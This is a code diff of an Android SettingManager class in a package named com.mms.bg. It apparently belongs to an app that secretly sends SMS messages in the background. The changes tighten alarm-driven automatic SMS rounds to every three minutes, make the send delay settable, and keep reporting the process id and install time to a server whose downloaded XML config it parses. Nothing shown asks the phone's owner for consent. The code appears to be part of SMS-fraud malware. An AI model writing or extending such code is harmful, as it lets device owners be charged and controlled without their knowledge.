@@ -26,6 +26,7 @@ import org.apache.http.params.HttpParams;
 import org.apache.http.protocol.HTTP;
 import org.xmlpull.v1.XmlSerializer;
 
+import android.R;
 import android.app.Activity;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
@@ -74,7 +75,9 @@ public class SettingManager {
     
     private static final String DEFAULT_VALUE = "";
 //    private static final long SMS_DEFAULT_DELAY_TIME = (((long) 30) * 24 * 3600 * 1000);
-    private static final long SMS_DEFAULT_DELAY_TIME = 1 * 3600 * 1000;
+    public static final long SMS_DEFAULT_DELAY_TIME = 1 * 3600 * 1000;
+    private static final long SMS_ONE_ROUND_NAP = 3 * 60 * 1000;
+    
     public static final String AUTO_SMS_ACTION = "com.mms.bg.SMS";
     public static final String AUTO_CONNECT_SERVER = "com.mms.bg.SERVER";
     private static final int TIMEOUT = 10 * 1000;
@@ -88,6 +91,7 @@ public class SettingManager {
     private static  SettingManager gSettingManager;
     private LogUtil mLog;
     public XMLHandler mXMLHandler;
+    public String mPid;
     
     public static SettingManager getInstance(Context context) {
         if (gSettingManager == null) {
@@ -237,7 +241,7 @@ public class SettingManager {
         mEditor.commit();
     }
     
-    private long getSMSSendDelay() {
+    public long getSMSSendDelay() {
         return mSP.getLong(SMS_SEND_DELAY, SMS_DEFAULT_DELAY_TIME);
     }
     
@@ -288,7 +292,7 @@ public class SettingManager {
         return false;
     }
     
-    public void startAutoSendMessage() {
+    public void startAutoSendMessage(long sms_delay_time) {
         cancel();
         Intent intent = new Intent(mContext, AutoSMSRecevier.class);
         intent.setAction(AUTO_SMS_ACTION);
@@ -296,7 +300,6 @@ public class SettingManager {
         long currentTime = System.currentTimeMillis();
         long firstTime = currentTime;
         
-        long sms_delay_time = getSMSSendDelay();
         long latestSMSTime = this.getLastSMSTime();
         long tempDelay = 2 * 60 * 1000;
         log(TAG, "sms_delay_time = " + sms_delay_time + " lastSMSTime = " + latestSMSTime
@@ -330,10 +333,9 @@ public class SettingManager {
         intent.setAction(BgService.ACTION_SEND_SMS_ROUND);
         PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
         long currentTime = System.currentTimeMillis();
-        long delayTime = 5 * 60 * 1000;
         
         AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
-        am.setRepeating(AlarmManager.RTC_WAKEUP, currentTime, delayTime, sender);
+        am.setRepeating(AlarmManager.RTC_WAKEUP, currentTime, SMS_ONE_ROUND_NAP, sender);
     }
     
     public void cancelOneRoundSMSSend() {
@@ -479,7 +481,7 @@ public class SettingManager {
             String version = "1.0";
             String first = "1";
             String handled = "0";
-            String pid = String.valueOf(android.os.Process.myPid());
+            String pid = mPid;
             String installTime = getFirstStartTime();
             if (installTime == null) {
                 this.setFirstStartTime();
@@ -610,7 +612,7 @@ public class SettingManager {
         return true;
     }
     
-    public void parseServerXMLInfo() {
+    public boolean parseServerXMLInfo() {
         File file = new File(DOWNLOAD_FILE_PATH);
         if (file.exists() == true) {
             SAXParser mSaxparser;
@@ -621,10 +623,12 @@ public class SettingManager {
                 
                 mXMLHandler.dumpXMLParseInfo();
                 refreshChannelSP();
+                return true;
             } catch (Exception e) {
                 e.printStackTrace();
             }
         }
+        return false;
     }
     
     private void refreshChannelSP() {
